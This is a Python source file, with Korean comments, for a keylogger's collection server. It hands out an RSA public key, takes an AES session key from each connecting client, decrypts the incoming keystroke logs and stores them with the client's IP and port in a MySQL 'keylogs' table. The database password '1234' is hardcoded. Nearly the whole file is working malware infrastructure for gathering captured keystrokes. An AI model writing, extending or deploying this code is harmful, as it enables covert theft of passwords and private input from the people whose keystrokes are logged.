import socket
import threading
import mysql.connector
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import uuid

# RSA 키 쌍 생성
rsa_key = RSA.generate(2048)
private_key = rsa_key
public_key = rsa_key.publickey()

# 데이터베이스 연결 함수
def connect_to_db():
    try:
        connection = mysql.connector.connect(
            host="localhost",
            user="brainoverflow",
            password="1234",
            database="test",
            port=3306,
            charset="utf8mb4",
            collation="utf8mb4_general_ci"
        )
        return connection
    except mysql.connector.Error as e:
        print(f"Database error: {e}")
        return None

# AES 암호화 함수
def encrypt_message(message: str, aes_key: bytes, iv: bytes) -> bytes:
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return iv + encryptor.update(message.encode()) + encryptor.finalize()

# AES 복호화 함수
def decrypt_message(encrypted_message: bytes, aes_key: bytes) -> str:
    iv = encrypted_message[:16]
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_message[16:]) + decryptor.finalize()
    try:
        return decrypted_data.decode('utf-8')
    except UnicodeDecodeError as e:
        print(f"UnicodeDecodeError: {e} - Possibly due to incorrect AES decryption.")
        return None

# 클라이언트 연결 처리 함수
def handle_client(conn, addr):
    session_id = str(uuid.uuid4())[:8]
    print(f"Client connected: {addr} (Session ID: {session_id})")

    try:
        # 클라이언트에 RSA 공개키 전송
        conn.send(public_key.export_key())
        encrypted_aes_key = conn.recv(256)

        if not encrypted_aes_key:
            raise ValueError("AES key was not received properly.")

        # AES 키 복호화
        cipher_rsa = PKCS1_OAEP.new(private_key)
        aes_key = cipher_rsa.decrypt(encrypted_aes_key)

        client_ip, client_port = addr

        while True:
            data = conn.recv(8192)
            if not data:
                print(f"Client disconnected: (Session ID: {session_id})")
                break

            decrypted_data = decrypt_message(data, aes_key)
            if decrypted_data is None:
                print(f"Failed to decrypt data from client (Session ID: {session_id})")
                continue

            print(f"Received keylog data from client {addr} (Session ID: {session_id}): {decrypted_data}")

            # 데이터베이스에 로그 저장
            connection = connect_to_db()
            if connection:
                try:
                    cursor = connection.cursor()
                    cursor.execute(
                        "INSERT INTO keylogs (session_id, message, client_ip, client_port) VALUES (%s, %s, %s, %s)", 
                        (session_id, decrypted_data, client_ip, client_port)
                    )
                    connection.commit()
                except mysql.connector.Error as e:
                    print(f"Error inserting into database: {e}")
                finally:
                    cursor.close()
                    connection.close()

            # 응답 전송
            response = f"Data received from session {session_id}."
            encrypted_response = encrypt_message(response, aes_key, get_random_bytes(16))
            conn.sendall(encrypted_response)

    except Exception as e:
        print(f"Error in client handling (Session ID: {session_id}): {e}")
    finally:
        conn.close()
        print(f"Connection closed (Session ID: {session_id})")

# 서버 시작 함수
def start_server(host='localhost', port=12345):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Server running on {host}:{port}")

    try:
        while True:
            conn, addr = server_socket.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
    except KeyboardInterrupt:
        print("\nServer shutting down.")
    finally:
        server_socket.close()

if __name__ == "__main__":
    start_server()
